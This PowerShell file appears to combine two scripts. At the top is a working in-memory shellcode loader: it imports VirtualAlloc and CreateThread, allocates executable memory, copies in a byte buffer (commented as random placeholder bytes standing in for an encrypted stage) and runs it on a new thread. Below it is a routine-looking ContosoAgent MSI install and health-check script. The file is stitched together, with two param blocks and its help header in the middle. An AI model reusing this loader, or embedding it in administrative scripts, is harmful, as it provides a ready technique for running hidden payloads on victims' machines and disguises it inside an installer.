

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xab, 0x9f, 0xd4, 0x5d, 0xa8, 0x50, 0xfd, 0x28, 0x82, 0xa4, 0x11, 0x62, 0x99, 0xad, 0x58, 0xbe,
        0x8b, 0x6a, 0xf8, 0xfb, 0xd3, 0xf6, 0x8e, 0xc8, 0xab, 0x11, 0x57, 0x19, 0xce, 0x07, 0xe0, 0x3d,
        0xff, 0x1a, 0x72, 0x0a, 0x79, 0xa1, 0x24, 0x60, 0x89, 0x29, 0x9f, 0x7b, 0xc7, 0x2b, 0x9d, 0xc9,
        0x43, 0xc0, 0x77, 0x26, 0xd0, 0x65, 0x02, 0x20, 0x19, 0xd3, 0x51, 0x03, 0xcc, 0x61, 0x1d, 0x64,
        0x00, 0x92, 0x33, 0xef, 0xeb, 0xf3, 0x93, 0x1b, 0x4e, 0xcb, 0x95, 0x55, 0xb1, 0x13, 0x54, 0xfd,
        0xe9, 0x3f, 0xa6, 0xa7, 0x23, 0x9f, 0xac, 0x9f, 0x74, 0x3b, 0xff, 0xc4, 0x20, 0xee, 0xe9, 0x09,
        0x2a, 0x5c, 0x10, 0x27, 0xb3, 0xa1, 0x87, 0x39, 0x7f, 0x49, 0x1e, 0xc6, 0xdf, 0xc8, 0x94, 0x7f,
        0xbb, 0x64, 0x5b, 0x9d, 0x16, 0x96, 0x9d, 0xfe, 0xa3, 0xb4, 0x0b, 0x9c, 0xf5, 0x2c, 0x71, 0xe1,
        0x51, 0xf8, 0xd2, 0x6f, 0x10, 0x4f, 0xd3, 0x91, 0x70, 0xc0, 0x79, 0xfe, 0xa3, 0xb6, 0xda, 0xbd,
        0xd0, 0xe3, 0x0e, 0x1c, 0xaa, 0x5d, 0x76, 0xbf, 0x12, 0x78, 0x2b, 0x0e, 0x05, 0xda, 0x92, 0x91,
        0x8e, 0x69, 0xae, 0xe4, 0x25, 0x34, 0xe9, 0xa0, 0x28, 0x5c, 0x61, 0x6d, 0xdc, 0x6f, 0x0b, 0xdb,
        0x62, 0xc5, 0x93, 0x02, 0x23, 0xbf, 0x76, 0x10, 0x31, 0xe5, 0x53, 0x96, 0x81, 0x90, 0x7a, 0x41,
        0xf7, 0x9e, 0xc4, 0x3d, 0xe4, 0xe2, 0x92, 0xe1, 0xd1, 0x94, 0x54, 0xcc, 0xb7, 0x8f, 0x93, 0xac,
        0x35, 0xaf, 0xbd, 0x54, 0xff, 0x5d, 0x16, 0x60, 0xd2, 0x07, 0x97, 0xdd, 0xd9, 0xf7, 0x6b, 0x3b,
        0x46, 0x13, 0x6b, 0x32, 0x17, 0xf0, 0x63, 0xd2, 0x64, 0xf5, 0xf7, 0x0e, 0x86, 0x9a, 0x17, 0xf5,
        0x86, 0xb2, 0x74, 0x1e, 0xeb, 0xd4, 0x86, 0xfc, 0x67, 0xbf, 0x52, 0x22, 0x39, 0x3d, 0x70, 0x3b,
        0x6a, 0xb0, 0x91, 0x3b, 0xda, 0x3b, 0x4d, 0x79, 0x21, 0x37, 0x29, 0xfe, 0xe0, 0xb4, 0x1a, 0xe7,
        0xdc, 0xbf, 0xd4, 0x19, 0x2c, 0x3b, 0x3b, 0x02, 0xc5, 0xe8, 0xc1, 0xb1, 0xbb, 0x38, 0x7e, 0x1b,
        0x3c, 0x5d, 0xad, 0x89, 0x3f, 0x3b, 0xca, 0x7d, 0xaa, 0xb8, 0x23, 0x0c, 0x14, 0x09, 0x6a, 0x41,
        0x15, 0xb5, 0xde, 0xad, 0x0d, 0x3a, 0xde, 0x6f, 0xac, 0x33, 0xce, 0x9c, 0x06, 0xb9, 0x5d, 0xa5,
        0x5b, 0xde, 0xd9, 0x37, 0xca, 0x2a, 0x46, 0x70, 0xe2, 0x7a, 0x0e, 0x75, 0xe2, 0xdc, 0x25, 0x8d,
        0xbd, 0xf3, 0xe3, 0x3d, 0xa1, 0xea, 0x11, 0xef, 0x4d, 0xc2, 0x08, 0x06, 0xee, 0xc0, 0x8a, 0xfb,
        0x77, 0x43, 0x51, 0x8a, 0xb0, 0x8f, 0x32, 0x76, 0xbd, 0x30, 0x80, 0x13, 0x98, 0x25, 0x39, 0x60,
        0x49, 0x12, 0x61, 0x43, 0x44, 0xb0, 0xe2, 0xa1, 0xef, 0x74, 0x65, 0x6d, 0xae, 0xcf, 0xfc, 0x57,
        0x18, 0x51, 0x7e, 0x8f, 0xce, 0x96, 0x3c, 0x57, 0x5a, 0xd2, 0x46, 0x68, 0xf7, 0x97, 0x84, 0xe0,
        0xe5, 0xfb, 0xed, 0xe5, 0x18, 0x93, 0x63, 0x68, 0xf8, 0x6c, 0x21, 0xbb, 0x0d, 0x0e, 0x4d, 0x85,
        0xd5, 0xff, 0xc5, 0xb6, 0x2c, 0xa8, 0x1e, 0xec, 0x5c, 0x91, 0x34, 0xd7, 0x43, 0xad, 0x2a, 0x3f,
        0x0f, 0x23, 0x95, 0x86, 0xcc, 0x8b, 0xda, 0x11, 0x93, 0xdd, 0x9f, 0x12, 0x1c, 0x56, 0x57, 0x94,
        0x88, 0x05, 0x52, 0x81, 0xab, 0xeb, 0xdb, 0xf6, 0xc9, 0x57, 0x26, 0xa8, 0xde, 0x31, 0xa7, 0xc7,
        0x15, 0xf8, 0xc2, 0x39, 0xc6, 0x1b, 0x59, 0xad, 0xaf, 0xa9, 0x40, 0xbc, 0xf5, 0xf2, 0xe2, 0x09,
        0x0e, 0xf1, 0x02, 0xf3, 0xc6, 0x95, 0x0d, 0xc2, 0xc5, 0xa9, 0x1d, 0x69, 0x0e, 0x8b, 0x37, 0xc9,
        0x1c, 0xf8, 0xaa, 0x46, 0x5d, 0x53, 0xad, 0x3e, 0x5a, 0xbb, 0x35, 0x66, 0x80, 0x11, 0x4b, 0x80,
        0xeb, 0xdb, 0x91, 0x43, 0x39, 0x6f, 0xab, 0xc9, 0xea, 0x6f, 0xbd, 0x38, 0x8f, 0xd8, 0x49, 0x59,
        0xda, 0xd5, 0x53, 0x7c, 0x0f, 0xfe, 0xb3, 0x59, 0xf1, 0x2d, 0x57, 0xb4, 0xcf, 0xa5, 0x4f, 0x3a,
        0xc8, 0x0c, 0xfc, 0xeb, 0x24, 0xea, 0x6c, 0xdd, 0x97, 0xe6, 0x3e, 0x82, 0x3d, 0xcf, 0x66, 0xd2,
        0xf3, 0x24, 0xed, 0xc2, 0x56
    )

    $BufferAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 747)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Installs the ContosoAgent package and validates the resulting service.
.DESCRIPTION
    Runs the vendor MSI unattended, ensures the service is registered, opens the
    local firewall port and waits for the health endpoint to answer.
    Every step writes to the installation log so a failed rollout can be traced
    on the target host.
.PARAMETER InstallerPath
    Overrides the default value defined in the parameter block.
.NOTES
    Author: IT Systems
    Last updated: 2026-05-04
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$InstallerPath = 'C:\Scripts\packages\ContosoAgent-6.4.6.msi',
    [string]$ServiceName = 'ContosoAgent',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$Port = 9443,
    [int]$TimeoutSec = 120,

    [string]$LogPath = "C:\Logs\install-contosoagent-2024-07-05.log",
    [string]$RuleName = "ContosoAgent Inbound"
)
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$hostName = $env:COMPUTERNAME
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}

if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)

$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}

$regPath = "HKLM:\SOFTWARE\Contoso\ContosoAgent"
if (-not (Test-Path -Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '6.4.6' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null

$rule = Get-NetFirewallRule -DisplayName 'ContosoAgent Inbound' -ErrorAction SilentlyContinue
if (-not $rule) {
    New-NetFirewallRule -DisplayName 'ContosoAgent Inbound' -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
    Write-Verbose 'Firewall rule created.'
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
$details = [pscustomobject]@{
    Product   = 'ContosoAgent'
    Version   = '6.4.6'
    Service   = $installed.Name
    Status    = $installed.Status
    Port      = $Port
    Installer = $InstallerPath
    LogPath   = $LogPath
    InstalledAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$details | ConvertTo-Json -Depth 3 | Set-Content -Path ($LogPath.Replace('.log', '.json')) -Encoding UTF8

$style = @'
<style>
body { font-family: Arial; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($details) | ConvertTo-Html -Title 'Installation summary' -Head $style |
    Set-Content -Path ($LogPath.Replace('.log', '.html')) -Encoding UTF8

$MailTo = "deploy@adatum.com"
$subject = "ContosoAgent 6.4.6 deployed on $env:COMPUTERNAME"

Send-MailMessage -To $MailTo -From 'deploy@adatum.com' -Subject $subject `
    -Body 'Installation completed and the service is responding.' -SmtpServer "smtp.adatum.com" -Port 25 -UseSsl

$stale = Get-ChildItem -Path $env:TEMP -Filter 'contosoagent-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
foreach ($dir in $stale) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Host ("Deployment finished for {0}" -f $ServiceName) -ForegroundColor Green

$logTail = Get-Content -LiteralPath $LogPath -Tail 5 -ErrorAction SilentlyContinue
if ($logTail) {
    Write-Verbose ("Last log lines: {0}" -f ($logTail -join ' | '))
}

$uninstallKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
$entry = Get-ChildItem -Path $uninstallKey -ErrorAction SilentlyContinue |
    ForEach-Object { Get-ItemProperty $_.PSPath } |
    Where-Object { $_.DisplayName -like 'ContosoAgent*' } | Select-Object -First 1
if ($entry) {
    Write-Verbose ("Registered version: {0}" -f $entry.DisplayVersion)
}

$disk = Get-PSDrive -Name C
Write-Verbose ("Free space on C: {0} GB" -f [math]::Round($disk.Free / 1GB, 1))

$rebootPending = Test-Path -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending'
if ($rebootPending) {
    Write-Warning 'A reboot is pending before the next deployment.'
}

$agentConfig = Join-Path $env:ProgramData 'ContosoAgent\agent.json'
if (Test-Path -LiteralPath (Split-Path -Parent $agentConfig)) {
    Write-Verbose ("Config folder present: {0}" -f (Split-Path -Parent $agentConfig))
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
